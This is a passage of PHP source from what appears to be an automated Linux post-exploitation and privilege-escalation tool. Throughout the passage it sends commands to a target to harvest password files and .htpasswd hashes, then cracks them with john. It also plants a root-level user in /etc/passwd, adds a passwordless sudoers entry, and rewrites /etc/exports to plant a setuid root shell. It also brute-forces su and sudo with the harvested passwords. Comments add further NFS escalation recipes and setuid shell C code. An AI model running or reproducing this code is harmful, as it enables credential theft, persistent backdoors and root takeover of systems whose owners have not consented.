        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "wtmp";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "udev";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "messages";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "syslog";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "debug";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "boot";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        
        $this->ssTitre("looks for hidden files");
        $data = "find / -name \".*\" -type f ! -path \"/proc/*\" ! -path \"/sys/*\" -exec ls -al {} \; 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "dmesg | grep -i -E \"(segfault|root|passw)\" ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        
        $this->note("OpenBSD");
        $data = "grep -v -e '^$' /etc/master.passwd  | grep -v '^#'  2>/dev/null ";
        $lines = $this->req_str($stream,$data,$this->stream_timeout,"");
        $result .= $lines;
        $this->pause();
        
        $data = "grep -r -i pass /var/www/* 2>/dev/null";
        $lines = $this->req_str($stream,$data,$this->stream_timeout,"");
        $result .= $lines;
        $this->pause();
        
        
        $this->note("htpasswd check");
        $users_pass_htpasswd = array();
        $data = "find / -name .htpasswd -print -exec cat {} \; 2>/dev/null  | grep ':' | sort -u";
        $users_pass_found = trim($this->req_str($stream,$data,$this->stream_timeout,""));
        $result .= $users_pass_found ;
        $this->article("ALL USERS FOUND", $users_pass_found);
        if(!empty($users_pass_found)){
            $tmp_users = array();
            $tmp_pass = array();
            
            exec("echo '$users_pass_found' | grep ':' > $this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd   ");
            if (!file_exists("$this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd.pot")) $this->requette("john $this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd --pot=$this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd.pot --fork=12 --wordlist:\"$this->dico_password\" ");
            $result .= $this->req_ret_str("john --show $this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd");
            $tab_user2pass = $this->req_ret_tab("cat $this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd 2> /dev/null | grep ':' ");
            
            if (!empty($tab_user2pass)){
                foreach ($tab_user2pass as $user2tmp){
                    //if (preg_match('/(?<user2name>\w+)\:(?<user2cpw>\w+)\:(?<user2uid>\d+)\:(?<user2gid>\d+)\:(?<user2full_name>\w+)\:(?<user2home>\w+)\:(?<user2shell>\w+)/',$line,$user))
                    if(!empty($user2tmp)){
                        $auth_user2name = $this->req_ret_str("echo '$user2tmp' | cut -d':' -f1 ");
                        $auth_user2name = trim($auth_user2name);
                        $this->article("USER NAME", $auth_user2name);
                        $auth_user2pass = $this->req_ret_str("echo '$user2tmp' | cut -d':' -f2 ");
                        $auth_user2pass = trim($auth_user2pass);
                        $this->article("USER PASSWORD", $auth_user2pass);
                        
                        if(!empty($auth_user2name)) $result .= $this->yesAUTH($this->port2id, $auth_user2name, $auth_user2pass,NULL,NULL,NULL,NULL,NULL,"crack $this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd with john ", $this->ip2geoip());
                    }
                }
            }
            
            
            
            exec("echo '$users_pass_found' | grep ':' | cut -d ':' -f1   ",$tmp_users);
            exec("echo '$users_pass_found' | grep ':' | cut -d ':' -f2   ",$tmp_pass);
            if( !empty($tmp_users)) $users_pass_htpasswd += [ $tmp_users[0] => $tmp_pass[0] ];
            unset($tmp_users);unset($tmp_pass);
        }
        $users_pass_htpasswd = array_unique(array_map("trim",$users_pass_htpasswd));
        foreach ($users_pass_htpasswd as $user_htpasswd_name => $user_htpasswd_pass ){
            if (!empty($user_htpasswd_name)){
                
                $result .= $this->article("User", $user_htpasswd_name);
                $result .= $this->article("PASS", $user_htpasswd_pass);
            }
        }
        $this->pause();
        return $result;
    }
    
    public function misc2etc_passwd2crackpass($stream,$username2avoid,$etc_passwd_lanpath){
        
        $result = "";
        $this->ssTitre(__FUNCTION__);
        $chaine = "Encrypted password: The ':x:' denotes encrypted password which is actually stored inside /shadow file. 
If the user does not have a password, then the password field will have an *(asterisk).";
        $this->note($chaine);
        $data = "grep ':*:' $etc_passwd_lanpath 2>/dev/null";
        $lines = $this->req_str($stream,$data,$this->stream_timeout,"");
        $this->article("Users with NoPassword", $lines);
        if (!empty($lines)) $users_nopasswd = explode('\n', $lines);
        
        $data = "grep -v '^[^:]*:[x]' $etc_passwd_lanpath 2>/dev/null | grep -v '$username2avoid' ";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->note("checks to see if any hashes are stored in /etc/passwd (depreciated  *nix storage method)");
        $data = "grep -v '^[^:]*:[x]' $etc_passwd_lanpath 2>/dev/null";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        
        return $result;
    }
    
    public function misc2etc_passwd2add($stream,$username,$userpass,$etc_passwd_lanpath){
        
        $result = "";
        $this->ssTitre(__FUNCTION__);
        $username = trim($username);
        $userpass = trim($userpass);
        $etc_passwd_lanpath = trim($etc_passwd_lanpath);
        
        $obj_filename = new FILE($etc_passwd_lanpath);
        
        $user = $this->created_user_name;
        $query = "mkpasswd -m SHA-512 $userpass";
        $user_pass_crypt = trim($this->req_ret_str($query));
        $query = "openssl passwd -1 -salt $userpass";
        $user_pass_crypt = trim($this->req_ret_str($query));
        $query = "openssl passwd -1 -salt $username $userpass";
        $user_pass_crypt = trim($this->req_ret_str($query));
        $this->article("user_pass_crypt",$user_pass_crypt);
        $search = $user.':'.$user_pass_crypt.':0:0:root:/root:/bin/sh';
        
        if ($this->file4writable($obj_filename->file_path)){
            if (!$this->file4search($obj_filename->file_path, $search)){
                $result .= $this->file4add($obj_filename->file_path, $search);
            }
            //$result .= $this->stream4root($this->stream);
            $result .= $this->stream8ssh8passwd($this->ip,$this->port,$this->created_user_name, $userpass);
        }
        return $result;
    }
    
    
    public function misc2etc_passwd2nopasswd($stream,$username2avoid,$etc_passwd_lanpath){
        
        $result = "";
        $this->ssTitre(__FUNCTION__);
        
        return $result;
    }
    
    public function misc2etc_passwd($stream){
        $this->ssTitre(__FUNCTION__);
        // https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/
        
        $etc_passwd_lanpath = "/etc/passwd";
        if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_passwd2nopasswd($stream,$this->created_user_name, $etc_passwd_lanpath);        
        if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_passwd2crackpass($stream,$this->created_user_name, $etc_passwd_lanpath);
        if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_passwd2adduser($stream,$this->created_user_name, $this->created_user_pass,$etc_passwd_lanpath);
        
        
        return $result;
   }
    
    
   public function misc2etc_sudoers($stream){
        $this->ssTitre(__FUNCTION__);
        $etc_sudoers_path = "/etc/sudoers";
        $obj_filename = new FILE($etc_sudoers_path);
        $search = "$this->uid_name ALL=(ALL:ALL) NOPASSWD:ALL";
        
        if ($this->file4writable($obj_filename->file_path)){
            if (!$this->file4search($obj_filename->file_path, $search)){
                $this->file4add($obj_filename->file_path, $search);
            }
            $this->users4root($this->uid_name, '');
        }
    }
    
  
    
    
    
 
    
    public function misc2etc_exports2setsuid($stream,$mount_rhost_path){
        $this->ssTitre(__FUNCTION__);
        $this->article("LD_PRELOAD Exploit","This attack involves .so files (part of the dynamic link library) being used by programs.
        The attacker can add a program pretending to be one of these libraries so that when a program is
        run it will execute the program pretending to be a library, this is useful if you are calling
        a program that has the suid bit set to root, this. 
        So when the program is first run, it will attempt to load the library it requires
        (but it has been replaced with code the attacker wants executed) and thus runs the commands
        in the program placed by the attacker, with the permissions of the owner of the calling program.");
        $suid = <<<EOC
        #include <stdio.h>
        #include <sys/types.h>
        #include <unistd.h>
        int main(void){
        setuid(0);
        setgid(0);
        seteuid(0);
        setegid(0);
        execvp("/bin/sh", NULL, NULL);
        // execl("/bin/sh","sh",(char*)0);
        }
EOC;
        $data = "echo '$suid' > $this->vm_tmp_lin/suid.c ";
        //$this->req_str($stream,$data,$this->stream_timeout,"");
        $this->req_ret_str($data);
        
        $this->pause();
        
        $data = "gcc -m32 -o $this->vm_tmp_lin/suid $this->vm_tmp_lin/suid.c ";
        //$this->req_str($stream,$data,$this->stream_timeout,"");
        $this->req_ret_str($data);
        
        $this->pause();
        
        $data = "chmod u+s $this->vm_tmp_lin/suid ";
        //$this->req_str($stream,$data,$this->stream_timeout,"");
        $this->req_ret_str($data);
        
        $data = "ls -al $this->vm_tmp_lin/suid ";
        //$this->req_str($stream,$data,$this->stream_timeout,"");
        $this->req_ret_str($data);
        
        $this->pause();
        
        $data = "chmod 4755 $this->vm_tmp_lin/suid ";
        //$this->req_str($stream,$data,$this->stream_timeout,"");
        $this->req_ret_str($data);
        
        $data = "ls -al $this->vm_tmp_lin/suid";
        //$this->req_str($stream,$data,$this->stream_timeout,"");
        $this->req_ret_str($data);
        
        $this->pause();
        
        $data = "mount $mount_rhost_path /tmp";
        $result .= $this->req_ret_str($data);
        $this->pause();
        
        $template_id_euid = "$this->vm_tmp_lin/suid %ID%";

        $this->pentest8id($stream,$template_id_euid);

        $this->pause();
        
        $result .= $this->users4root($this->created_user_name, $this->created_user_pass);
        
    }
    
    
    public function misc2etc_exports($stream){
        /*
         https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/
         https://guide.offsecnewbie.com/privilege-escalation/linux-pe
         
         Look for vulnerable/privileged components such as: mysql, sudo, udev, python
         
         
         If there is a cronjob that runs as run but it has incorrect file permissions, you can change it to run your SUID binary and get a shell.
         
         The following command will list processes running by root, permissions and NFS exports.
         
         $ echo 'services running as root'; ps aux | grep root;  echo 'permissions'; ps aux | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++'; echo 'nfs info'; ls -la /etc/exports 2>/dev/null; grep -v -e '^$' /etc/exports 2>/dev/null
         
         NFS
         
         cp $shell /mnt/<share>
         chmod 4777 bash
         ./bash -p
         
         
         $result .= $this->rouge("No root");
         $cmd = "grep -v -e '^$' /etc/exports | grep -v \"#\" | sed \"s/,root_squash/,no_root_squash/g\"  ";
         
         
         NFS Share
         If you find that a machine has a NFS share you might be able to use that to escalate privileges if it's misconfigured.
         Check if the target machine has any NFS shares:
         
         showmount -e [host]
         
         If it does, then mount it to your filesystem:
         mount [host]:/ /tmp/
         
         If that succeeds then you can go to /tmp/share and look for interesting files. Test if you can create files, then check with your low-priv shell what user has created that file. If it says root has created the file, then you can create a file and set it with suid-permission from your attacking machine, then execute it with your low privilege shell.
         This code can be compiled and added to the share. Before executing it by your low-priv user make sure to set the SUID-bit on it, like this:
         bash
         chmod 4777 exploit
         #include <stdio.h>
         #include <stdlib.h>
         #include <sys/types.h>
         #include <unistd.h>
         
         int main()
         {
         setuid(0);
         system("/bin/bash");
         return 0;
         }
         
         
         */
        $result = "";
        $this->ssTitre(__FUNCTION__);
        
        $this->note("How are file-systems mounted?");
        $data = "mount";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "cat /proc/mounts";
        $lines = $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $this->note("Provides a list of mounted file systems.
Can be used to determine where other interesting files might be located");
        $data = "cat /proc/mounts";
        $this->req_str($stream,$data,$this->stream_timeout,"");
        

        
        $this->note("The /etc/exports file lists all directories exported by Network File System (NFS).
If /etc/exports if writable, you can add an NFS entry or change and existing entry adding the no_root_squash flag to a root directory, put a binary with SUID bit on, and get root.");
        $data = "grep -v -e '^$' /etc/exports | grep -v \"#\"  2> /dev/null ";
        $result .= $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $data = "grep -v -e '^$' /etc/exports | grep -v \"#\" | sed \"s/,root_squash/,no_root_squash/g\"  2> /dev/null ";
        $result .= $this->req_str($stream,$data,$this->stream_timeout,"");
        
        $etc_sudoers_path = "/etc/exports";
        $obj_filename = new FILE($etc_sudoers_path);
        $whoami = $this->whoami();
        
        $search_data = '/  *(rw, no_root_squash)';
        if ($this->file4writable($obj_filename->file_path)){
            if (!$this->file4search($obj_filename->file_path, $search_data)){
                $result .= $this->file4add($obj_filename->file_path, $search_data);
                $result .= $this->misc2etc_exports2setsuid("/");
            }
            $result .= $this->users4root($whoami, '');
        }
        
        
      

        
        return $result;
    }
    
    
    
    
    
    
    public function users($stream){
        $this->titre(__FUNCTION__);
        $users_passwd = $this->ip2users4passwd();
        
        foreach ($users_passwd as $user2name => $user2pass){
            if (!empty($user2name)) {
                if (!$this->ip2root8db($this->ip2id)) $this->users2sudoers8filepath($stream,$this->users2sudoers2list($stream,$user2name, $user2pass));
                

            }
        }
        $this->pause();
        
        $tab_users_shell = $this->ip2users4shell();
        foreach ($tab_users_shell as $user2name_shell)
            if (!empty($user2name_shell)) {
                if (!$this->ip2root8db($this->ip2id)) $this->users2sudoers8filepath($stream,$this->users2sudoers2list($stream,$user2name_shell, ""));
            }
        
        $this->users4user($stream);
        $this->users4pass($stream);        
    }
    
    
    
    
    
    public function users2sudoers2list($stream,$user_name,$user_pass){
        $this->titre("Linux Privilege Escalation using Sudo Rights");
        $result = "";
        $this->ssTitre("sudo -l – Prints the commands which we are allowed to run as SUDO ");

        $data = "echo '$user_pass' | sudo -l -S -U '$user_name' "; // su --login '$user_name'
        $result .=  $this->req_str($this->stream,$data,$this->stream_timeout*3,"");
        $data = "sudo -l -U '$user_name' "; // su --login '$user_name'
        //$result .= $this->req_str($this->stream,$data,$this->stream_timeout*3,"");
        return $result;
    }
    
    
    
    
    
    public function users2sudoers8filepath($stream,$sudoers_str){
        $result = "";
        $this->ssTitre(__FUNCTION__);
        $data = "echo '$sudoers_str' | grep -E \"\([a-zA-Z0-9_\-]{1,}\)\" | cut -d')' -f2  | grep -Po \"[[:space:]]{1}/[a-z0-9\-_]{1,}/[[:print:]]{1,}\"  | grep -Po \"(/[a-z0-9\-\_]{1,}(/[a-z0-9\-\_\.]{1,})+)\"  ";
        $list_apps = exec($data);
        $result .= $list_apps;
        $tab_apps = explode(",", $list_apps);
        $tab_apps = array_unique($tab_apps);
        sort($tab_apps,SORT_STRING);
        $this->article("App Sudoers", $this->tab($tab_apps));$this->pause();
        $size = count($tab_apps);
        for ($i=0;$i<$size;$i++){
            $app = $tab_apps[$i];
            $app = trim($app);
            if (!empty($app)) {
                
                $this->article("$i/$size", $app);
                if (!$this->ip2root8db($this->ip2id)) $this->root8bin($stream,$app, TRUE, '');$this->pause();
                if (!$this->ip2root8db($this->ip2id)) $this->suids4one($stream,$app);$this->pause();
                if (!$this->ip2root8db($this->ip2id)) $this->suids8env2path2xtrace($stream,$app);$this->pause();
            }
        }
        return $result;
    }
    
    
    
    
    public function users4user($stream){
        $this->ssTitre(__FUNCTION__);
                $users_passwd = $this->ip2users4passwd();
        foreach ($users_passwd as $user2name => $user2pass){
            if (!empty($user2name)) {
                if (!empty($user2pass) && !$this->ip2root8db($this->ip2id) ) $this->users2user($user2name,$user2pass);
            }
        }
        
    }
    
    
    
    public function users2user($stream,$user_name,$user_pass){
        $this->ssTitre(__FUNCTION__);
        $user_name = trim($user_name);
        $user_pass = trim($user_pass);
        
        $template_id_euid = "( sleep $this->stream_timeout ;echo $user_pass; sleep 5;) |  socat - EXEC:\"su $user_name -c '%ID%'\",pty,stderr,setsid,sigint,ctty,sane";
        $this->pentest8id($stream,$template_id_euid);
        $template_id_euid = "(sleep 1;echo '$user_pass';sleep 1;) |  su $user_name -c '%ID%'  ";
        $this->pentest8id($stream,$template_id_euid);
        $template_id_euid = "echo '$user_pass' | sudo -S su $user_name -c '%ID%'  ";
        $this->pentest8id($stream,$template_id_euid);
        

   
        
    }
    
    
    
    
    
    
}
?>
